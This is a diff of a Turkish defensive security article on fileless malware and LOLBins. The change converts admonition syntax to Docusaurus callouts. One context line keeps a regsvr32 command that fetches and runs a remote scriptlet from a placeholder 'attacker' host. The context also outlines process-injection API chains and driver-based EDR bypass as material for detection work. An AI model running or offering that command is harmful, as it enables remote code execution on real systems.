@@ -49,8 +49,9 @@ Araştırmalar, PowerShell çalıştırılmasının dosyasız olayların **%77,6
 | Constrained Language Mode | GPO/WDAC | Tehlikeli cmdlet kısıtlaması |
 | AMSI | Varsayılan etkin | Bellek içi script tarama |
 
-> [!WARNING]
-> Saldırganlar PowerShell v2'ye downgrade ederek (logging yok) veya PowerShell 7 üzerinden v5 monitörünü atlatarak kaçabilir. Her iki sürümde de logging açık olmalıdır. AMSI obfuscation ile atlatılabilir — AMSI ve Script Block Logging farklı amaçlara hizmet eder; ikisi birlikte gereklidir.
+:::caution
+Saldırganlar PowerShell v2'ye downgrade ederek (logging yok) veya PowerShell 7 üzerinden v5 monitörünü atlatarak kaçabilir. Her iki sürümde de logging açık olmalıdır. AMSI obfuscation ile atlatılabilir — AMSI ve Script Block Logging farklı amaçlara hizmet eder; ikisi birlikte gereklidir.
+:::
 
 ### WMI Tabanlı Saldırılar (T1047, T1546.003)
 
@@ -137,8 +138,9 @@ Standart DLL enjeksiyonu `LoadLibrary` ile diske yazılmış kütüphaneyi yükl
 | Process Hollowing | Hayır | CreateProcess(SUSPENDED) → NtUnmapViewOfSection → WriteProcessMemory → ResumeThread | Yüksek |
 | Early Bird APC | Hayır | CreateProcess(SUSPENDED) → QueueUserAPC → ResumeThread | Çok Yüksek |
 
-> [!CAUTION]
-> BYOVD (Bring Your Own Vulnerable Driver) saldırıları çekirdek seviyesinde EDR'ı tamamen devre dışı bırakabilir. HVCI ve vulnerable driver blocklist bu vektöre karşı kritik önlemdir.
+:::danger
+BYOVD (Bring Your Own Vulnerable Driver) saldırıları çekirdek seviyesinde EDR'ı tamamen devre dışı bırakabilir. HVCI ve vulnerable driver blocklist bu vektöre karşı kritik önlemdir.
+:::
 
 ---
 
@@ -173,8 +175,9 @@ regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
 ![LOLBins azaltma stratejileri](./lolbins_mitigation_malware_attacks.webp)
 *LOLBins saldırılarına karşı katmanlı azaltma kontrolleri*
 
-> [!TIP]
-> LOLBAS tespiti için [lolbas-project.github.io](https://lolbas-project.github.io) ve SigmaHQ kural kütüphanesi temel başvuru kaynaklarıdır. Yeni bir NOPASSWD veya WDAC publisher kuralı eklenmeden önce LOLBAS/GTFOBins çapraz kontrolü zorunlu kılınmalıdır.
+:::tip
+LOLBAS tespiti için [lolbas-project.github.io](https://lolbas-project.github.io) ve SigmaHQ kural kütüphanesi temel başvuru kaynaklarıdır. Yeni bir NOPASSWD veya WDAC publisher kuralı eklenmeden önce LOLBAS/GTFOBins çapraz kontrolü zorunlu kılınmalıdır.
+:::
 
 ---
 
@@ -305,8 +308,9 @@ index=powershell EventCode=4104
 | Persistence | WMI Event Subscription (T1546.003) | Sysmon EID 19-21 |
 | Lateral | WMI/WinRM (T1047) | 4624, 4104, RPC logları |
 
-> [!NOTE]
-> CIS Controls v8 **Control 8** (Audit Log Management) ve **Control 10** (Malware Defenses) bu tespit altyapısını kapsar. NIST SP 800-53 SI-4 (System Monitoring), AU-2/AU-6 (Audit) muadildir.
+:::note
+CIS Controls v8 **Control 8** (Audit Log Management) ve **Control 10** (Malware Defenses) bu tespit altyapısını kapsar. NIST SP 800-53 SI-4 (System Monitoring), AU-2/AU-6 (Audit) muadildir.
+:::
 
 ---
 
